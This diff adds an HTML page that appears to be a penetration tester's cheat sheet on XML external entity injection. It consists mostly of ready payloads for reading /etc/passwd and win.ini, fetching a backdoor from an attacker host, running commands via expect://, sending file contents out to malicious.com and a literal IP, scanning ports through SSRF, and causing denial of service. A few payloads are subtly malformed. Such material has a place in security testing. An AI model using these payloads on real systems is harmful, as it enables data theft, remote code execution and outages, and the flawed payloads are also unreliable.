@@ -1,0 +1,117 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b><span style="font-size: 14pt">XML external entity injection<br/>
+<br/>
+</span><span style="font-size: 12pt">DETECTION</span><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+</span></b><span style="font-size: 10pt">Look for inputs which accepts any XML data:</span><ul><li><span style="font-size: 10pt">direct input via URL parameters</span></li>
+<li><span style="font-size: 10pt">input via files containing XML data (.xml, .docx, .xlsc, .pptx, ...)</span></li>
+</ul>
+<b><br/>
+<br/>
+</b><b>Original request (POST data)</b><br/>
+<br/>
+<tt>&lt;Search&gt;&lt;SearchTerm&gt;nothing will change&lt;/SearchTerm&gt;&lt;/Search&gt;</tt><br/>
+<b><br/>
+<span style="font-size: 14pt">Internal entity</span><br/>
+<br/>
+Test if internal entity possible by defining and referencing it<br/>
+</b><tt>&lt;!DOCTYPE person [<ul><li style="list-style-type: none">&lt;!ENTITY person &quot;AliceEntity&quot;&gt;</li>
+</ul>
+]&gt;<br/>
+</tt><tt>&lt;somexml&gt;&lt;message&gt;Hello world &amp;person;&lt;/message&gt;&lt;/somexml&gt;</tt><b><br/>
+</b>This should output<b><br/>
+</b><tt>Hello world AliceEntity</tt><br/>
+<b><br/>
+<span style="font-size: 14pt">External entity</span><br/>
+</b><br/>
+Instead of <tt>file:// </tt>wrapper we can use<br/>
+<tt>php://filter/convert.base64-encode/resource=/file/to/read<br/>
+</tt>wrapper and decode output in burp<br/>
+<br/>
+<b>Simple test for external entity<br/>
+</b><tt><span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt">python -m SimpleHttpServer 80</span><br/>
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://www.malicious.com/XXE&quot; &gt; ]&gt;;<br/>
+</tt><tt>&lt;some_proper_tagname&gt;&amp;xxe;&lt;/some_proper_tagname&gt;</tt><br/>
+<b><br/>
+</b><b>File retrieval and LFI</b>(sometimes works for directory listing <tt>file:///etc/</tt>)<br/>
+<tt><br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ENTITY filexxe SYSTEM &quot;file:///windows/win.ini&quot;&gt;</li>
+</ul>
+</tt><tt>]&gt;</tt><br/>
+<tt>&lt;Search&gt;&lt;SearchTerm&gt;&amp;filexxe;&lt;/SearchTerm&gt;&lt;/Search&gt;<br/>
+<br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ENTITY filexxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</li>
+</ul>
+</tt><tt>]&gt;</tt><br/>
+<tt>&lt;Search&gt;&lt;SearchTerm&gt;&amp;filexxe;&lt;/SearchTerm&gt;&lt;/Search&gt;<br/>
+<br/>
+</tt><b>RFI and RCE</b><br/>
+<tt><br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ENTITY rfixxe SYSTEM &quot;http://&lt;attacker_ip&gt;/backdoor.php&quot;&gt;</li>
+</ul>
+</tt><tt>]&gt;</tt><br/>
+<tt>&lt;Search&gt;&lt;SearchTerm&gt;&amp;rfixxe;&lt;/SearchTerm&gt;&lt;/Search&gt;<br/>
+</tt><br/>
+<b>RCE through enabled expect:// wrapper<br/>
+</b><tt><br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ENTITY rce SYSTEM &quot;expect://id&quot;&gt;</li>
+</ul>
+</tt><tt>]&gt;</tt><br/>
+<tt>&lt;Search&gt;&lt;SearchTerm&gt;&amp;rce;&lt;/SearchTerm&gt;&lt;/Search&gt;</tt><br/>
+<br/>
+<b>Proxy HTTP traffic injection</b><br/>
+<tt><br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:25&quot;&gt;</li>
+</ul>
+]&gt;<br/>
+&lt;Search&gt;&lt;SearchTerm&gt;&amp;xxe;&lt;/SearchTerm&gt;&lt;/Search&gt;<br/>
+<br/>
+</tt><b>Extract data via outbound HTTP requests</b><tt><br/>
+</tt><tt><br/>
+Version 1<br/>
+&lt;!DOCTYPE foo [<ul><li style="list-style-type: none">&lt;!ELEMENT foo ANY &gt;</li>
+<li style="list-style-type: none">&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</li>
+<li style="list-style-type: none">&lt;!ENTITY callhome SYSTEM &quot;www.malicious.com/?%xxe;&quot;&gt;</li>
+</ul>
+]&gt;<br/>
+&lt;foo&gt;&amp;callhome;&lt;/foo&gt;<br/>
+<br/>
+</tt>Version 2 (remote server gets malicious DTD from attacker's machine)<br/>
+<tt>&lt;!DOCTYPE root [<ul><li style="list-style-type: none">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</li>
+<li style="list-style-type: none">&lt;!ENTITY % dtd SYSTEM &quot;http://197.37.102.90/ext.dtd&quot;&gt;</li>
+</ul>
+%dtd;<br/>
+%send;<br/>
+</tt><tt>]]&gt;</tt><br/>
+<br/>
+<span style="font-size: 12pt"><b>EXPLOITATION</b></span><br/>
+<br/>
+<b>HTTP requests to internal servers which cannot be reached from outside (SSRF)</b><br/>
+<b><br/>
+</b><b>Port scanner (SSRF)</b><br/>
+<tt><br/>
+&lt;!DOCTYPE student [<ul><li style="list-style-type: none">&lt;!ENTITY oops SYSTEM &quot;http://scanme.nmap.org:20/&quot;&gt;</li>
+</ul>
+]&gt;<br/>
+&lt;student&gt;&lt;name&gt;&amp;oops;&lt;/name&gt;&lt;/student&gt;<br/>
+</tt><br/>
+Analyze errors in responses<br/>
+<br/>
+<b>DOS attacks</b><br/>
+call payload multiple times<tt><br/>
+</tt><tt><br/>
+&lt;!DOCTYPE student [<ul><li style="list-style-type: none">&lt;!ENTITY oops SYSTEM &quot;file:///dev/random&quot;&gt;</li>
+</ul>
+]&gt;<br/>
+</tt><tt>&lt;student&gt;&lt;name&gt;&amp;oops;&lt;/name&gt;&lt;/student&gt;</tt><br/>
+<br/>
+Quadratic blowup<tt><br/>
+</tt><tt>&lt;!DOCTYPE student [<ul><li style="list-style-type: none">&lt;!ENTITY x &quot;xxxxxxxxxxxxxxxxx...&quot;&gt; (50,000-100,000)</li>
+</ul>
+]&gt;<br/>
+&lt;student&gt;&amp;x;&amp;x;&amp;x;&amp;x;&amp;x;&amp;x;&amp;x;&amp;x;&amp;x;...&lt;/student&gt; (50,000-100,00)<br/>
+</tt></body></html>
